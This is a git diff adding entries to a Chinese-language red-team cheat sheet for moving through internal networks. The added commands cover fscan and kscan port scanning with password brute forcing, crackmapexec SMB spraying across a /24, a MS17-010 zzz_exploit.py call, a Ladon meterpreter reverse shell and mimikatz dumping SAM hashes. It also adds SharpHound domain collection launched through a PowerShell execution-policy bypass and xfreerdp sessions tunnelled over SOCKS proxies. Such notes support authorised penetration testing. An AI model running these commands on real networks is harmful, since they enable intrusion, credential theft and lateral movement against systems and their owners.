@@ -3,8 +3,22 @@ https://gitee.com/windyjxx/projects
 ## 信息收集
 [ENScan_GO | 剑指HW/SRC，解决在HW/SRC场景下遇到的各种针对国内企业信息收集难题](https://github.com/wgpsec/ENScan_GO)
 
+### fscan
+
+```bash
+fscan -h 10.63.81.21 -p 1-65535 -np
+fscan -h 10.63.81.21 -p 1-65535 -np -nobr
+```
+
 ### kscan
 kscan.exe -t 10.0.0.0/8 --hydra --hydra-pass file:pwd.txt
+
+### crackmapexec
+
+```bash
+crackmapexec smb <ip>/24 -u <useranme> -p <password>
+crackmapexec smb 172.22.3.0/24 -u a -p a
+```
 
 ## C2工具类似msf
 empire && starkiller VS metasploit && armitage
@@ -147,7 +161,9 @@ zzz_exploit.py
 netlogon lsarpc samr browser atsvc DAV RPC SERVICE epmapper eventlog InitShutdown keysvc lsass LSM_API_service ntsvcs plugplay protected_storage router SapiServerPipeS-1-5-5-0-70123 scerpc srvsvc tapsrv trkwks W32TIME_ALT wkssvc PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER db2remotecmd ```netlogon lsarpc samr browser atsvc DAV RPC SERVICE epmapper eventlog InitShutdown keysvc lsass LSM_API_service ntsvcs plugplay protected_storage router SapiServerPipeS-1-5-5-0-70123 scerpc srvsvc tapsrv trkwks W32TIME_ALT wkssvc PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER db2remotecmd
 python zzz_exploit.py <ip> <pipe>
 ```
-### Ladon
+### Ladon/proxifier
+proxifier不支持ICMP或者说ew等代理工具也不支持ICMP协议，所以代理后探测存活主机就不要使用Ping或OnlinePC模块了，使用扫描模块需加noping参数，非扫描模块不需要noping。探测存活主机可使用osscan、webscan、urlscan、ms17010、smbghost等模块，
+
 [Usage](https://github.com/k8gege/Ladon/wiki/Ladon-Usage)
 
 检测
@@ -160,6 +176,8 @@ Ladon ip24.txt ICMP
 Ladon 192.168.1.8 WhatCMS # 扫描IP
 Ladon noping 192.168.1.8 WhatCMS # 扫描IP 禁PING扫描
 Ladon 172.20.10.1/24 WebScan
+Ladon noping 10.x.x.x PortScan
+Ladon noping 10.x.x.x PortScan 21,22,80
 ```
 
 正向代理Socks5
@@ -233,6 +251,8 @@ Ladon ReverseTcp 192.168.1.8 4444 meter
 
 ## frp
 [神兵利器 | Frp搭建多层内网通信隧道总结（建议收藏）](https://mp.weixin.qq.com/s/mO378TD7Jp3R8x7e7EpOCg)
+[隧道？代理？端口转发？（一文读懂）](https://mp.weixin.qq.com/s/PDIWU-xej9SffRXlDEJYdA)
+
 https://www.jianshu.com/p/42861aa3fea2
 
 
@@ -577,9 +597,20 @@ DNS隧道
 * dnscat2
 * iodine
 
+* [内网代理工具rakshasa](https://github.com/Mob2003/rakshasa)
+
 # 远程桌面
-xfreerdp
+## xfreerdp
+```bash
+xfreerdp /drive:kali,home/kali/vmware /v:127.0.0.1 /u:MyUser /p:MyPasswd
+xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPasswd
+xfreerdp /v:${your ip} /u:${your user name} /f /monitors:1 +fonts +window-drag +clipboard
+xfreerdp /proxy:socks5://127.0.0.1:1080 /drive:kali,home/kali/vmware /v:127.0.0.1 /u:MyUser /p:MyPasswd
+/proxy:[<proto>://][<user>:<password>@]<host>:<port>
+```
+
 ## remmina
+basic里可以设置共享文件夹
 
 socks5代理
 ```shell
@@ -664,7 +695,37 @@ mstsc /admin /v:192.168.50.153:33089
 ```bash
 # multirdp
 mimikatz.exe privilege::Debug ts::multirdp exit
+
+# 通过注册表导出的 HKLM\Security,sam,system, 3个文件来导出hash
+mimikatz.exe "lsadump::sam /system:system /sam:sam" exit
 ```
+
+## bloodhound/neo4j
+
+* neo4j
+* [download](https://neo4j.com/download-center/#community)
+
+```bash
+neo4j.bat console
+# 检查是否能登录
+URL：neo4j://localhost:7687
+用户名(默认)：neo4j
+密码(默认)：neo4j
+```
+
+[SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) 采集, 
+
+```bash
+# 方式1
+SharpHound.exe -c all
+# 方式2
+powershell -exec bypass -command "Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all"
+```
+zip 压缩包的格式保存，拷贝到 BloodHound 主机上，右侧图标 Upload Data
+
+文档
+* [渗透测试之内网攻防篇：使用 BloodHound 分析大型域内环境](https://www.freebuf.com/articles/web/288370.html)
+
 
 # 团队协作 
 rocketchat 局域网聊天工具。web 可传文件
